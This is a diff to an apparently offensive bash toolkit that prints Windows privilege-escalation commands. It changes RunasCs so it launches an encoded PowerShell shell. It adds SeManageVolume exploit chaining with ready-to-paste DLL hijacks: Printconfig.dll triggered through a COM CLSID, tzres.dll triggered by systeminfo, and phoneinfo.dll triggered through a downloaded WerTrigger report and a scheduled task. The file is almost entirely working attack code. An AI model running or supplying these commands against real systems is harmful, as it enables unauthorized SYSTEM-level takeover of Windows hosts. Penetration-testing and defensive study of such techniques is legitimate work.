@@ -397,7 +397,7 @@ download_runas() {
     if [[ ! -d runascs ]]; then
         mkdir runascs
     fi
-    pushd runascs || return 1
+    pushd runascs || return 1 
     echo "Downloading RunasCs tool."
     if [[ ! -f "RunasCs.exe" ]]; then
         wget "$url" -O runascs.zip >> $trail_log
@@ -411,15 +411,24 @@ download_runas() {
         echo "Password is required for RunasCs."
         return 1
     fi
-    echo 'cd C:\windows\temp;'
+    popd || return 1 >/dev/null
+    generate_windows_download "runascs/RunasCs.exe" "RunasCs.exe"
+}
+
+perform_runas() {
     if [[ -z $cmd ]]; then
         cmd=$(get_powershell_interactive_shell)
-        create_run_windows_exe
-        cmd="c:\\windows\\temp\\run_windows.exe"
+        cmd=$(create_run_windows_exe)
+        cmd="cd C:\windows\temp; $cmd"
+        cmd=$(encode_powershell "$cmd")
     fi
-    popd || return 1
-    generate_windows_download "runascs/RunasCs.exe" "RunasCs.exe"
-    echo "RunasCs.exe $username $password \"$cmd\";"
+    if [[ -z "$domain" ]]; then
+        domain_option=""
+    else
+        domain_option="-d $domain"
+    fi    
+    echo ".\RunasCs.exe $domain_option $username $password \"$cmd\" $runas_additional_options;"
+
 }
 
 perform_semanagevolume_exploit() {
@@ -436,15 +445,48 @@ perform_semanagevolume_exploit() {
     popd || return 1
     echo 'cd C:\windows\temp;'
     generate_windows_download "$exploit_dir/SeManageVolumeExploit.exe" "SeManageVolumeExploit.exe"    
-    echo '.\SeManageVolumeExploit.exe'
+    echo '.\SeManageVolumeExploit.exe;'
     create_run_windows_dll
+    perform_printerconfig_dll_hijack
+    perform_tzres_dll_hijack
+    perform_wer_error_dll_hijack
+}
+
+perform_printerconfig_dll_hijack() {
+    if [[ ! -z $create_dll ]] && [[ $create_dll == "true" ]]; then
+        create_run_windows_dll
+    fi
     #echo 'move C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.old.dll'
-    #echo 'copy .\run_windows.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll'
-    #echo '$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")'
-    #echo '$object = [Activator]::CreateInstance($type)'
+    echo "cd C:\windows\temp;"
+    echo 'copy .\run_windows.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll;'
+    echo '$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}");'
+    echo '$object = [Activator]::CreateInstance($type);'
+}
+
+perform_tzres_dll_hijack() {
+    if [[ ! -z $create_dll ]] && [[ $create_dll == "true" ]]; then
+        create_run_windows_dll
+    fi
     echo 'copy .\run_windows.dll C:\Windows\System32\wbem\tzres.dll'
     echo "systeminfo"
 }
+
+perform_wer_error_dll_hijack() {
+    if [[ ! -z $create_dll ]] && [[ $create_dll == "true" ]]; then
+        create_run_windows_dll
+    fi
+    local url="https://raw.githubusercontent.com/sailay1996/WerTrigger/refs/heads/master/bin/Report.wer"
+    if [[ ! -f "Report.wer" ]]; then
+        echo "Downloading WerTrigger..." >> $trail_log
+        wget "$url" -O Report.wer >> $trail_log
+    fi    
+    generate_windows_download "Report.wer"
+    echo "md c:\\programdata\\microsoft\\windows\\wer\reportqueue\\a_b_c_d_e"
+    echo "copy .\Report.wer C:\\programdata\\microsoft\\windows\\wer\reportqueue\\a_b_c_d_e\\Report.wer"
+    echo "copy .\run_windows.dll C:\\Windows\\System32\\phoneinfo.dll"
+    echo "schtasks /run /tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\""
+}
+
 #=========================
 #impersonation escalations
 #=========================
